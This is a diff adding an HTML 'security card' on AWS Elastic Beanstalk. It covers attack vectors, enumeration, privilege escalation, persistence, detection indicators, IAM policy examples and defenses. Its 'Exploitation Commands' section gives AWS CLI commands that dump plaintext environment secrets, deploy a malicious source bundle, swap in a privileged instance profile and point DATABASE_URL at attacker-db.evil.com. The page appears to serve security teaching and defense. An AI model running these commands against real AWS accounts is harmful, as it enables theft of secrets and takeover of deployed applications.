@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS Elastic Beanstalk Security | AWS Security Cards</title>
+<meta name="description" content="AWS Elastic Beanstalk is a PaaS that orchestrates EC2, Auto Scaling, ELB, S3, CloudWatch, and IAM to deploy applications with predictable S3 bucket naming and plaintext environment variables.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #f59e0b15, #0a0e1a, #f9731615);
+    border: 1px solid #f59e0b4d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #f59e0b0d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #f59e0b33;
+    color: #f59e0b;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #f59e0b4d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #f87171; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/elasticbeanstalk-card.webp" alt="AWS Elastic Beanstalk Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/elasticbeanstalk.svg" alt="AWS Elastic Beanstalk Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS Elastic Beanstalk Security</span>
+        <span class="header-badge">COMPUTE</span>
+      </div>
+      <p class="header-desc">AWS Elastic Beanstalk is a PaaS that orchestrates EC2, Auto Scaling, ELB, S3, CloudWatch, and IAM to deploy applications. It creates a predictable S3 bucket (elasticbeanstalk-region-account-id) containing source bundles, exposes environment variables in plaintext through its API, and runs EC2 instances with IMDS.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">HIGH</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">Regional</div>
+          <div class="stat-label">Scope</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">EC2 Instances</div>
+          <div class="stat-label">IMDS Exposure</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">Svc + Instance</div>
+          <div class="stat-label">IAM Roles</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#f59e0b;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #f59e0b;">Application Deployment &amp; S3 Storage</h4>
+          <p>Every application version is stored as a ZIP/WAR source bundle in elasticbeanstalk-region-account-id S3 bucket. Source bundles frequently contain hardcoded secrets, database credentials, and API keys.</p>
+          <div class="attack-note"><span style="color:#f59e0b;">Attack note:</span> The S3 bucket name is deterministic -- knowing the region and account ID is enough to construct it. Source bundles often contain .env files with secrets.</div>
+        </div>
+        <div>
+          <h4 style="color: #f59e0b;">Environment Config &amp; Secrets Exposure</h4>
+          <p>Environment properties are stored as option settings and returned in plaintext by DescribeConfigurationSettings. Any principal with this permission can read every environment variable including secrets.</p>
+          <div class="attack-note"><span style="color:#f59e0b;">Attack note:</span> Environment variables are not encrypted at rest. They are visible in plaintext in the console and API responses. Use Secrets Manager references instead.</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 80%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">8.0</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">Elastic Beanstalk combines multiple attack surfaces: deterministic S3 bucket naming exposes source code, plaintext environment variables leak secrets through the API, EC2 instances with IMDS provide credential theft opportunities, and .ebextensions hooks allow code execution as root.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">&#x2694;&#xFE0F; Attack Vectors</h3><h4 style="color: #f87171;">Source Code and Secrets Theft</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Download source bundles from predictable S3 bucket</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Extract env vars via DescribeConfigurationSettings</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access .env files and config files from source bundles</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Read secrets from S3-stored deployment artifacts</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Enumerate app versions to find older leaked secrets</li></ul><h4 style="color: #f87171;">Instance and Deployment Compromise</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> SSRF to IMDS (169.254.169.254) on deployed app</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Inject malicious code via .ebextensions commands</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Execute scripts via .platform/hooks/ (runs as root)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Abuse container_commands for pre-deployment RCE</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Modify environment to attach over-privileged instance profile</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">&#x26A0;&#xFE0F; Misconfigurations</h3><h4 style="color: #fb923c;">Secrets and Access</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Hardcoded secrets in environment properties</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Database credentials in .ebextensions option_settings</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> S3 source bucket with overly permissive policy</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Source bundles containing .env files with secrets</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> S3 bucket using default SSE-S3 instead of SSE-KMS</li></ul><h4 style="color: #fb923c;">Infrastructure Security</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> IMDSv1 enabled (default on AL2 and earlier)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Over-privileged instance profile</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Security groups allowing 0.0.0.0/0 inbound</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Managed platform updates disabled</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> VPC flow logs not enabled</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">&#x1F50D; Enumeration</h3><div class="cmd-block">
+          <div class="cmd-title">List All Applications</div>
+          <pre><code>aws elasticbeanstalk describe-applications</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">List All Environments</div>
+          <pre><code>aws elasticbeanstalk describe-environments</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Extract Environment Config (Plaintext Secrets)</div>
+          <pre><code>aws elasticbeanstalk describe-configuration-settings \
+  --application-name APP_NAME \
+  --environment-name ENV_NAME</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">List Application Versions (S3 Locations)</div>
+          <pre><code>aws elasticbeanstalk describe-application-versions \
+  --application-name APP_NAME</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Download Source Bundle from S3</div>
+          <pre><code>aws s3 cp s3://elasticbeanstalk-REGION-ACCOUNT_ID/APP_NAME/SOURCE_BUNDLE.zip .</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">&#x1F4C8; Privilege Escalation</h3><h4 style="color: #c084fc;">Via Source Bundle Injection</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> CreateApplicationVersion + UpdateEnvironment for RCE</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> .ebextensions commands run as root on deployment</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> .platform/hooks/ scripts run as root</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Reverse shell installation via deployment hooks</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Instance profile credential exfiltration</li></ul><h4 style="color: #c084fc;">Via Environment Manipulation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Modify DATABASE_URL to attacker-controlled server</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Inject reverse shell via consumed env variable</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Change instance profile to more privileged role</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Access elevated IMDS credentials via iam:PassRole</li></ul><div class="note"><strong>Key insight:</strong> Elastic Beanstalk exposes secrets through three channels: IMDS on instances, environment variables via the API, and source bundles in S3. All three must be secured independently.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">&#x1F517; Persistence</h3><h4 style="color: #facc15;">Code-Level</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Deploy malicious source bundle with backdoor</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> .ebextensions for persistent root-level access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> .platform/hooks for deployment-time execution</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify S3 source bundles for future deployments</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Inject malicious environment variables</li></ul><h4 style="color: #facc15;">Infrastructure-Level</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Maintain IMDS credential access from instances</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Store exfiltrated credentials for out-of-band access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify security groups for persistent network access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Swap instance profile to maintain elevated access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create additional app versions as backup access</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">&#x1F6E1;&#xFE0F; Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateApplicationVersion - new source bundle uploaded</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateEnvironment - environment config changed</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DescribeConfigurationSettings - secrets read</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> SwapEnvironmentCNAMEs - DNS swap between envs</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> RebuildEnvironment - environment rebuilt</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DescribeConfigurationSettings from unusual principals</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> S3 GetObject on elasticbeanstalk-* from unknown IPs</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateEnvironment changing instance profile</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateApplicationVersion from unexpected S3 location</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Multiple DescribeApplicationVersions calls (recon)</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid"><div class="cmd-block">
+          <div class="cmd-title">Extract All Environment Variables</div>
+          <pre><code>aws elasticbeanstalk describe-configuration-settings \
+  --application-name APP_NAME \
+  --environment-name ENV_NAME \
+  --query 'ConfigurationSettings[0].OptionSettings[?Namespace==`aws:elasticbeanstalk:application:environment`].[OptionName,Value]' \
+  --output table</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Deploy Malicious Source Bundle</div>
+          <pre><code>aws elasticbeanstalk create-application-version \
+  --application-name APP_NAME \
+  --version-label malicious-v1 \
+  --source-bundle S3Bucket=elasticbeanstalk-REGION-ACCOUNT,S3Key=deploy.zip</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Swap Instance Profile</div>
+          <pre><code>aws elasticbeanstalk update-environment \
+  --environment-name ENV_NAME \
+  --option-settings Namespace=aws:autoscaling:launchconfiguration,OptionName=IamInstanceProfile,Value=PRIVILEGED_PROFILE</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Inject Environment Variable</div>
+          <pre><code>aws elasticbeanstalk update-environment \
+  --environment-name ENV_NAME \
+  --option-settings Namespace=aws:elasticbeanstalk:application:environment,OptionName=DATABASE_URL,Value=attacker-db.evil.com</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid"><div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Full Elastic Beanstalk Access</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: &quot;elasticbeanstalk:*&quot;,
+  &quot;Resource&quot;: &quot;*&quot;
+}</code></pre>
+          <p class="policy-desc">Full control -- can read secrets, deploy malicious code, and change instance profiles</p>
+        </div><div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Read-Only (No Config Access)</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;elasticbeanstalk:DescribeApplications&quot;,
+    &quot;elasticbeanstalk:DescribeEnvironments&quot;,
+    &quot;elasticbeanstalk:DescribeEnvironmentHealth&quot;
+  ],
+  &quot;Resource&quot;: &quot;*&quot;
+}</code></pre>
+          <p class="policy-desc">Environment monitoring without exposing configuration secrets</p>
+        </div><div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Env Variable Read Access</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: &quot;elasticbeanstalk:DescribeConfigurationSettings&quot;,
+  &quot;Resource&quot;: &quot;*&quot;
+}</code></pre>
+          <p class="policy-desc">Allows reading all environment variables (including plaintext secrets) from any environment</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid"><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">&#x1F510;</span>
+            <div>
+              <h4>Use Secrets Manager Instead of Env Properties</h4>
+              <p>Never store raw secrets in Elastic Beanstalk environment properties. Use Secrets Manager references.</p>
+              <pre><code>aws elasticbeanstalk update-environment --environment-name ENV \
+  --option-settings Namespace=aws:elasticbeanstalk:application:environmentsecrets,OptionName=DB_PASSWORD,Value=arn:aws:secretsmanager:REGION:ACCT:secret:my-pass</code></pre>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">&#x1F512;</span>
+            <div>
+              <h4>Enforce IMDSv2 on All Instances</h4>
+              <p>Block SSRF-based credential theft by requiring IMDSv2 on all EC2 instances.</p>
+              <pre><code>aws elasticbeanstalk update-environment --environment-name ENV \
+  --option-settings Namespace=aws:autoscaling:launchconfiguration,OptionName=DisableIMDSv1,Value=true</code></pre>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">&#x1F511;</span>
+            <div>
+              <h4>Enable S3 Bucket Encryption</h4>
+              <p>Enable KMS encryption on the Elastic Beanstalk S3 bucket and restrict access to service role only.</p>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">&#x1F464;</span>
+            <div>
+              <h4>Use Least-Privilege Instance Profiles</h4>
+              <p>Create custom instance profile with only required permissions. Remove unused managed policies.</p>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">&#x1F504;</span>
+            <div>
+              <h4>Enable Managed Platform Updates</h4>
+              <p>Keep OS, runtime, and web server patched automatically.</p>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">&#x1F6AB;</span>
+            <div>
+              <h4>Restrict DescribeConfigurationSettings</h4>
+              <p>Explicitly deny DescribeConfigurationSettings for all principals except deployment pipelines.</p>
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS Elastic Beanstalk Security Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
